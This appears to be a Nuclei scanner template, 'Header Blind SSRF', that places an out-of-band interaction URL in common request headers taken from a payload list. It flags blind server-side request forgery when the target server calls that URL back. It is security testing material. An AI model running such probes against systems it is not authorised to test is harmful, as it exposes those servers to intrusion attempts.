id: header-blind-ssrf

info:
  name: Header Blind SSRF
  author: geeknik
  severity: high
  description: Checks for Blind SSR via popular browser headers.

variables:
  ssrf_id: "{{randstr}}"

requests:
  - payloads:
      header: helpers/payloads/request-headers.txt

    raw:
      - |
        GET /?§header§ HTTP/1.1
        Host: {{Hostname}}
        §header§: {{interactsh-url}}/header-ssrf-{{ssrf_id}}/§header§
        Connection: close

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
      - type: word
        part: interactsh_request
        words:
          - "header-ssrf-{{ssrf_id}}"
